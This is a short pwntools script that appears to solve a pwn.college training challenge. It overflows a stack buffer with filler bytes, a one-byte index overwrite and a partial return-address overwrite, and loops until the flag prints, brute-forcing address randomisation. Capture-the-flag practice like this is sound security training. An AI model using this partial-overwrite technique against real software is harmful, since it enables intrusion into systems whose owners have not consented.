from pwn import *


while True:
  p = process('/challenge/babymem-level-9-0')
  p.recvuntil(b'Payload size:')
  p.sendline(b'122')

  payload = b'A' * 92 + p8(119) + p16(0x1cf9)

  p.recvline(b'Send your payload')
  p.send(payload)

# p.interactive()
  str = p.recvall(1)
    #print(str)
  if str.find(b'pwn.college{') != -1:
    print(str)
    break
